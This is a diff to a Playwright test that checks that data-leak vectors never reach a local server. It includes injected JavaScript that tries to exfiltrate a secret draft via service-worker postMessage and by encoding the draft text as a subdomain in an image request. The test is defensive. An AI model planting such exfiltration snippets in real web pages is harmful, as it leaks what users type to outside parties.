@@ -42,11 +42,13 @@ async def test_service_worker_vectors_never_reach_the_server(setup, mode):
         return orig(self)
     site.do_GET = do_GET
     await page.fill('#draft', SECRET)
-    await page.evaluate("navigator.serviceWorker.register('/sw.js').then(()=>navigator.serviceWorker.ready)")
-    await page.wait_for_timeout(1500)
+    # Round 9: the isolated session context blocks service workers outright, so registration never
+    # becomes ready. Do not wait for it forever; the vector must still go nowhere.
+    await page.evaluate("Promise.race([navigator.serviceWorker.register('/sw.js').then(()=>navigator.serviceWorker.ready),new Promise(r=>setTimeout(r,1500))]).catch(()=>0)")
+    await page.wait_for_timeout(500)
     BTN = "document.body.insertAdjacentHTML('beforeend','<button id=attack type=button>go</button>');"
-    code = {'sw_post_during_click': "navigator.serviceWorker.controller.postMessage('draft=UNAPPROVEDSECRET&run_id=attack')",
-            'sw_post_after_quiet': "setTimeout(()=>navigator.serviceWorker.controller.postMessage('draft=UNAPPROVEDSECRET&run_id=attack'),6000)",
+    code = {'sw_post_during_click': "(navigator.serviceWorker.controller||{postMessage(){}}).postMessage('draft=UNAPPROVEDSECRET&run_id=attack')",
+            'sw_post_after_quiet': "setTimeout(()=>(navigator.serviceWorker.controller||{postMessage(){}}).postMessage('draft=UNAPPROVEDSECRET&run_id=attack'),6000)",
             'host_subdomain': "new Image().src='http://'+document.querySelector('#draft').value.toLowerCase()+'.localhost:'+location.port+'/'"}[mode]
     await page.evaluate(BTN + f"document.querySelector('#attack').addEventListener('click',()=>{{{code}}});")
     site.hits.clear(); site.posts.clear()
